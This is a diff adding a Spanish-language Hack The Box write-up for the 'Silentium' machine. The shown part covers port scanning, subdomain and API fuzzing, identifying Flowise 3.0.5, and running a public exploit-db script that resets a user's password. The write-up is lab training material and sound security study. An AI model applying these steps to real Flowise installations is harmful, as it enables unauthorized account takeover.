@@ -1,0 +1,203 @@
+---
+title: Silentium
+featured: true
+lang: es
+image: ../../../../../images/writeups/hackthebox/silentium/silentium.png
+platform: htb
+difficulty: easy
+os: linux
+hints: []
+tags: []
+parent: writeups/hackthebox/machines
+draft: false
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/silentium/silentium.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Silentium](https://app.hackthebox.com/machines/Silentium)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/silentium 10.129.245.103
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openPorts 10.129.245.103
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://silentium.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Agregar `silentium.htb` al archivo `/etc/hosts`
+
+[http://silentium.htb/](http://silentium.htb/)
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' -ic -c -fs 178
+```
+
+```plaintext
+staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 172ms]
+```
+
+Agregar `staging.silentium.htb` al archivo `/etc/hosts`
+
+[http://staging.silentium.htb/signin](http://staging.silentium.htb/signin)
+
+[view-source:http://staging.silentium.htb/signin](view-source:http://staging.silentium.htb/signin)
+
+```html
+<head>
+  <title>Flowise - Build AI Agents, Visually</title>
+  <link rel="icon" href="favicon.ico" />
+  <!-- Meta Tags-->
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="theme-color" content="#2296f3" />
+  <meta name="title" content="Flowise - Build AI Agents, Visually" />
+  <meta
+    name="description"
+    content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+  />
+  <link rel="manifest" href="manifest.json" />
+  <link rel="apple-touch-icon" href="logo192.png" />
+  <meta
+    name="keywords"
+    content="react, material-ui, workflow automation, llm, artificial-intelligence"
+  />
+  <meta name="author" content="FlowiseAI" />
+  <!-- Open Graph / Facebook -->
+  <meta property="og:locale" content="en_US" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://flowiseai.com/" />
+  <meta property="og:site_name" content="flowiseai.com" />
+  <meta property="og:title" content="Flowise - Build AI Agents, Visually" />
+  <meta
+    property="og:description"
+    content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+  />
+  <!-- Twitter -->
+  <meta property="twitter:card" content="summary_large_image" />
+  <meta property="twitter:url" content="https://twitter.com/FlowiseAI" />
+  <meta
+    property="twitter:title"
+    content="Flowise - Build AI Agents, Visually"
+  />
+  <meta
+    property="twitter:description"
+    content="Open source generative AI development platform for building AI agents, LLM orchestration, and more"
+  />
+  <meta name="twitter:creator" content="@FlowiseAI" />
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap"
+    rel="stylesheet"
+  />
+  <script>
+    (function (w, r) {
+      w._rwq = r;
+      w[r] =
+        w[r] ||
+        function () {
+          (w[r].q = w[r].q || []).push(arguments);
+        };
+    })(window, "rewardful");
+  </script>
+  <script async src="https://r.wdfl.co/rw.js" data-rewardful="9a3a26"></script>
+  <script type="module" crossorigin src="/assets/index-C6GKaUTA.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-9xw-RjBM.css" />
+</head>
+```
+
+<div style="display: flex; justify-content: center;">
+
+![Silentium Burp](@images/writeups/hackthebox/silentium/silentium-burp.png)
+
+</div>
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://staging.silentium.htb/api/v1/FUZZ -ic -c -t 100 -fs 31
+```
+
+```plaintext
+attachments             [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 588ms]
+feedback_js             [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 184ms]
+ipdata                  [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 175ms]
+iphone                  [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 178ms]
+ipod                    [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 166ms]
+ipp                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 166ms]
+ips                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 174ms]
+ips_kernel              [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 174ms]
+ip                      [Status: 200, Size: 518, Words: 66, Lines: 1, Duration: 543ms]
+ipc                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 559ms]
+ipn                     [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 566ms]
+ping                    [Status: 200, Size: 4, Words: 1, Lines: 1, Duration: 164ms]
+pingback                [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 175ms]
+pricing                 [Status: 200, Size: 1258, Words: 64, Lines: 1, Duration: 629ms]
+version.json            [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 198ms]
+version                 [Status: 200, Size: 19, Words: 1, Lines: 1, Duration: 219ms]
+```
+
+```bash
+curl -s http://staging.silentium.htb/api/v1/version | jq
+```
+
+```json
+{
+  "version": "3.0.5"
+}
+```
+
+Google `flowise 3.0.5`
+
+[https://www.exploit-db.com/exploits/52557](https://www.exploit-db.com/exploits/52557)
+
+```bash
+python3 exploit.py -e "ben@silentium.htb" -p 'M3lv1n$Ctf' -u http://staging.silentium.htb
+```
+
+```plaintext
+_____       _                              _____
+/  __ \     | |                            /  ___|
+| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--.
+| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
+| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
+\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/
+                            __/ |
+                          |___/
+
+                by nltt0
+
+[x] Password changed
+```
+
+<div style="display: flex; justify-content: center;">
+
+![Silentium Forgot Password](@images/writeups/hackthebox/silentium/silentium-forgot-password.png)
+
+</div>
